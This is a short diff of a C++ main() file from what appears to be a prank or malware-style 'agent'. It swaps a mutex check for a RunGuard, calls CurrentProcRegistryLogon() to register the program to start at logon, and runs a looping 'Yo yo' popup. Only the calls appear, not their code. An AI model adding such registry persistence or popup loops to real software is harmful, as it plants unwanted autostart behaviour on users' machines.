@@ -1,27 +1,18 @@
 #include "SocketGuard.h"
-#include "Agent.h"
-#include "PopUp.h"
-#include "Presistence.h"
-#include "Mutex.h"
 
 #include <iostream>
 
-
+#include "Agent.h"
+#include "PopUp.h"
+#include "Presistence.h"
+#include "Resilience.h"
+#include "Mutex.h"
 
 int main(int argc, char* argv[]) {
     SocketGuard socketGuard;
+    RunGuard runGuard;
 
-    Mutex mutex(NULL, MUTEX_NAME, NULL, MUTEX_ALL_ACCESS);
-    DWORD wait = mutex.waitForSingleObject(0);
-
-    if (wait != 0) {
-        std::cout << "Process allready running\n";
-        exit(1);
-    }
-    
-    std::string path = getProcessExe();
-
-    RegistryLogon(path);
+    CurrentProcRegistryLogon();
 
     PopUp("Yo yo", POPUP_LOOP_CAPTION);
 
